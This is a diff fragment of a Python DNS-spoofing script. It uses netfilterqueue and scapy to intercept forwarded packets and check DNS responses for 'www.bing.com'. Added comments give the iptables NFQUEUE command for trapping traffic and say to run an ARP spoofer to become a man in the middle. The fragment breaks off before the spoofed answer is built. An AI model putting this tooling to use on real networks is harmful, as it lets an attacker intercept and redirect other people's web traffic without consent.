@@ -2,8 +2,11 @@
 import netfilterqueue
 import scapy.all as scapy
 
+#use iptables -I FORWARD -j NFQUEUE --queue-num 0 to trap packets in a queue 
+#use ARP SPOOFER to become MITM 
+
 def process_packet(packet):
-    scapy_packet = scapy.IP(packet.get_payload())
+    scapy_packet = scapy.IP(packet.get_payload()) #more data on the packet by converting it to a scapy packet
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname.decode()
         if 'www.bing.com' in qname:
